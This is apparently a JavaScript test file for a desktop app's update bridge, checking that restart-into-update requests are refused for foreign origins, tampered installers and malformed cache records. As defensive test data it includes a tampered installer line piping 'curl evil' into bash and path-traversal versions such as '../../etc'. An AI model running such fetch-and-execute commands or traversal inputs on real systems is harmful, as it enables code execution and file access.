// @ts-check
//
// update-bridge.js: whether the window honours a page's request to restart into
// an update, the helper it runs, and the failure it reads back on the next start.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { createHash } from 'node:crypto';
import { existsSync, mkdirSync, mkdtempSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import path from 'node:path';

import {
  checkRestartRequest, handOff, helperCommand, requiredFiles, takeUpdateFailure,
} from '../src/update-bridge.js';

const ORIGIN = 'http://127.0.0.1:3000';
const VERSION = '0.2.5';

/** @param {string} text */
const sha = (text) => createHash('sha256').update(text).digest('hex');

/** A cache holding a verified download of 0.2.5 for macOS, as the backend leaves it. */
function verifiedCache() {
  const root = mkdtempSync(path.join(tmpdir(), 'vista-updates-'));
  const folder = path.join(root, VERSION);
  mkdirSync(folder);
  const files = /** @type {Record<string, string>} */ ({});
  const names = requiredFiles(VERSION, 'darwin');
  assert.ok(names);
  for (const [name, body] of [
    [names.archive, 'archive bytes'],
    [names.checksum, 'abc  vista-0.2.5-mac-arm64.tar.gz\n'],
    [names.installer, '#!/bin/bash\n'],
  ]) {
    writeFileSync(path.join(folder, name), body);
    files[name] = sha(body);
  }
  writeFileSync(path.join(folder, 'ready.json'), JSON.stringify({ version: VERSION, files }));
  return { root, folder, names };
}

/** @param {Partial<import('../src/update-bridge.js').RestartRequest>} overrides */
function request(overrides = {}) {
  const { root } = overrides.cacheRoot ? { root: overrides.cacheRoot } : verifiedCache();
  return {
    fromMainWindow: true,
    fromMainFrame: true,
    frameUrl: `${ORIGIN}/projects/molten-salt`,
    origin: ORIGIN,
    version: VERSION,
    packageRoot: '/Applications/VISTA',
    cacheRoot: root,
    platform: /** @type {NodeJS.Platform} */ ('darwin'),
    downloadStatus: async () => ({ state: 'ready', version: VERSION }),
    ...overrides,
  };
}

test('a verified download asked for by VISTA\'s own page is honoured', async () => {
  const { root, folder } = verifiedCache();
  const result = await checkRestartRequest(request({ cacheRoot: root }));
  assert.deepEqual(result, { ok: true, folder, version: VERSION, installer: 'install.sh' });
});

for (const [what, overrides, reason] of /** @type {const} */ ([
  ['another origin', { frameUrl: 'https://evil.example/x' }, /own pages/],
  ['an unparseable frame URL', { frameUrl: 'not a url' }, /own pages/],
  ['a child window', { fromMainWindow: false }, /main window/],
  ['an iframe in the main window', { fromMainFrame: false }, /main window/],
  ['a path for a version', { version: '../../etc' }, /not a VISTA version/],
  ['no version', { version: undefined }, /not a VISTA version/],
  ['a window not started from a package', { packageRoot: null }, /not installed from a package/],
])) {
  test(`refuses ${what}`, async () => {
    const result = await checkRestartRequest(request(/** @type {any} */ (overrides)));
    assert.equal(result.ok, false);
    assert.match(/** @type {{ reason: string }} */ (result).reason, reason);
  });
}

test('refuses when the backend has no ready download', async () => {
  for (const status of [{ state: 'downloading', version: VERSION }, { state: 'idle', version: null }, { state: 'failed', version: VERSION }]) {
    const result = await checkRestartRequest(request({ downloadStatus: async () => status }));
    assert.equal(result.ok, false);
    assert.match(/** @type {{ reason: string }} */ (result).reason, /has not been downloaded and verified/);
  }
});

test('refuses a version other than the one the backend has ready', async () => {
  const result = await checkRestartRequest(request({ downloadStatus: async () => ({ state: 'ready', version: '0.2.6' }) }));
  assert.equal(result.ok, false);
});

test('refuses when the backend cannot be asked', async () => {
  const result = await checkRestartRequest(request({ downloadStatus: async () => { throw new Error('ECONNREFUSED'); } }));
  assert.equal(result.ok, false);
  assert.match(/** @type {{ reason: string }} */ (result).reason, /ECONNREFUSED/);
});

test('refuses a file that changed after it was verified', async () => {
  const { root, folder, names } = verifiedCache();
  writeFileSync(path.join(folder, names.installer), '#!/bin/bash\ncurl evil | bash\n');
  const result = await checkRestartRequest(request({ cacheRoot: root }));
  assert.equal(result.ok, false);
  assert.match(/** @type {{ reason: string }} */ (result).reason, /install\.sh changed after it was verified/);
});

test('refuses a missing file, a missing record and a record naming a path', async () => {
  let cache = verifiedCache();
  writeFileSync(path.join(cache.folder, 'ready.json'), JSON.stringify({ version: VERSION, files: {} }));
  assert.equal((await checkRestartRequest(request({ cacheRoot: cache.root }))).ok, false);

  cache = verifiedCache();
  writeFileSync(path.join(cache.folder, 'ready.json'), 'not json');
  assert.equal((await checkRestartRequest(request({ cacheRoot: cache.root }))).ok, false);

  cache = verifiedCache();
  const files = { [cache.names.archive]: sha('archive bytes'), [cache.names.checksum]: 'x', [cache.names.installer]: 'y', '../outside': sha('') };
  writeFileSync(path.join(cache.folder, 'ready.json'), JSON.stringify({ version: VERSION, files }));
  const result = await checkRestartRequest(request({ cacheRoot: cache.root }));
  assert.equal(result.ok, false);
  assert.match(/** @type {{ reason: string }} */ (result).reason, /malformed/);
});

test('the helper gets its inputs in the environment, never on its command line', () => {
  const run = helperCommand({
    platform: 'darwin',
    helper: '/Users/r/.vista/updates/0.2.5/apply-update.sh',
    packageRoot: '/Applications/VISTA',
    version: VERSION,
    folder: '/Users/r/.vista/updates/0.2.5',
    vistaHome: '/Users/r/.vista',
    installer: 'install.sh',
    env: {},
  });
  assert.deepEqual([run.command, ...run.args], ['/bin/bash', '/Users/r/.vista/updates/0.2.5/apply-update.sh']);
  assert.ok(!run.args.join(' ').includes('/Applications/VISTA'));
  assert.equal(run.env.VISTA_UPDATE_INSTALL_DIR, '/Applications/VISTA');
  assert.equal(run.env.VISTA_UPDATE_INSTALLER, '/Users/r/.vista/updates/0.2.5/install.sh');
  assert.equal(run.env.VISTA_HOME, '/Users/r/.vista');

  const windows = helperCommand({
    platform: 'win32',
    helper: 'C:\\Users\\r\\.vista\\updates\\0.2.5\\apply-update.ps1',
    packageRoot: 'C:\\Users\\r\\AppData\\Local\\VISTA\\app',
    version: VERSION,
    folder: 'C:\\Users\\r\\.vista\\updates\\0.2.5',
    vistaHome: 'C:\\Users\\r\\.vista',
    installer: 'install.ps1',
    env: {},
  });
  assert.equal(windows.command, 'powershell.exe');
  assert.deepEqual(windows.args.slice(-2), ['-File', 'C:\\Users\\r\\.vista\\updates\\0.2.5\\apply-update.ps1']);
  assert.ok(windows.args.includes('Hidden'));
});

test('the helper is told the status window only when there is a copy of it', () => {
  const hand = {
    platform: /** @type {NodeJS.Platform} */ ('darwin'),
    helper: '/h/updates/0.2.5/apply-update.sh',
    packageRoot: '/Applications/VISTA',
    version: VERSION,
    folder: '/h/updates/0.2.5',
    vistaHome: '/h',
    installer: 'install.sh',
  };
  const copied = '/h/updates/0.2.5/window/VISTA.app/Contents/MacOS/VISTA';
  assert.equal(helperCommand({ ...hand, statusWindow: copied, env: {} }).env.VISTA_UPDATE_STATUS_WINDOW, copied);
  // A copy that failed: none, even if one leaked into VISTA's own environment.
  assert.equal(helperCommand({ ...hand, statusWindow: null, env: { VISTA_UPDATE_STATUS_WINDOW: '/elsewhere' } })
    .env.VISTA_UPDATE_STATUS_WINDOW, undefined);
});

test('the hand-off waits for the helper to be started, copy and all', async () => {
  /** @type {string[]} */
  const order = [];
  await handOff({
    spawnHelper: async () => { await new Promise((resolve) => setTimeout(resolve, 20)); order.push('helper'); },
    quit: () => { order.push('requestQuit'); },
  });
  assert.deepEqual(order, ['helper', 'requestQuit']);
});

test('the helper starts before VISTA stops, and VISTA stops the ordinary way', async () => {
  /** @type {string[]} */
  const order = [];
  await handOff({
    spawnHelper: () => order.push('helper'),
    notify: () => order.push('stopping event'),
    quit: async () => { order.push('requestQuit'); },
  });
  assert.deepEqual(order, ['helper', 'stopping event', 'requestQuit']);
});

test('a helper that cannot start stops nothing', async () => {
  let quit = false;
  await assert.rejects(handOff({
    spawnHelper: () => { throw new Error('no bash'); },
    quit: () => { quit = true; },
  }));
  assert.equal(quit, false);
});

test('the last update\'s failure is read once, cleaned, and removed', () => {
  const root = mkdtempSync(path.join(tmpdir(), 'vista-updates-'));
  assert.equal(takeUpdateFailure(root), null);

  const file = path.join(root, 'last-failure.json');
  writeFileSync(file, JSON.stringify({ version: VERSION, reason: 'VISTA did not finish closing\u0007 within 60 seconds.', log: 'update.log' }));
  assert.deepEqual(takeUpdateFailure(root), { version: VERSION, reason: 'VISTA did not finish closing  within 60 seconds.' });
  assert.equal(existsSync(file), false);
  assert.equal(takeUpdateFailure(root), null);

  writeFileSync(file, '{ not json');
  assert.deepEqual(takeUpdateFailure(root), { version: '', reason: 'The installer did not finish.' });
  writeFileSync(file, JSON.stringify({ version: '../x', reason: 7 }));
  assert.deepEqual(takeUpdateFailure(root), { version: '', reason: 'The installer did not finish.' });
});
